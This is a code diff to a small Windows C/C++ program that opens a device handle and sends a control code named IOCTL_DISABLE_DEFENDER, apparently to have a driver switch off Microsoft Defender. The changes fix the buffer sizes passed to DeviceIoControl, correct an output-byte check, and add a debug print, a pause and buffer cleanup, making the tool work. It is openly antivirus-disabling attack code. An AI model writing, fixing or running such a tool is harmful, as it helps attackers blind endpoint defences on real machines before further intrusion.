@@ -22,14 +22,21 @@ int main()
     PVOID InputBuffer = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     PVOID OutputBuffer = VirtualAlloc(nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     DWORD BytesReturned = 0;
-    if (!DeviceIoControl(hDevice, IOCTL_DISABLE_DEFENDER, InputBuffer, sizeof(InputBuffer), OutputBuffer, sizeof(OutputBuffer), &BytesReturned, nullptr))
+    printf("SizeOf inputbuffer: 0x%x\n", sizeof(InputBuffer));
+    if (!DeviceIoControl(hDevice, IOCTL_DISABLE_DEFENDER, InputBuffer, 0x1000, OutputBuffer, 0x1000, &BytesReturned, nullptr))
     {
         printf("[-] IOCTL_DISABLE_DEFENDER (0x%x) failed with GetLastError() of: %u\n", IOCTL_DISABLE_DEFENDER, GetLastError());
         return -1;
     }
     printf("[+] IOCTL_DISABLE_DEFENDER (0x%x) executed successfully!\n", IOCTL_DISABLE_DEFENDER);
-    if (*(BYTE*)OutputBuffer != (BYTE)"\x00") 
+
+    if (*(BYTE*)OutputBuffer != 0x00) 
         printf("[*] IOCTL_DISABLE_DEFENDER Output buffer: %s\n", (CHAR*)OutputBuffer);
-    
+
+    getchar();
+
+    VirtualFree(InputBuffer, 0x1000, MEM_RELEASE);
+    VirtualFree(OutputBuffer, 0x1000, MEM_RELEASE);
+
 	return 0;
 }
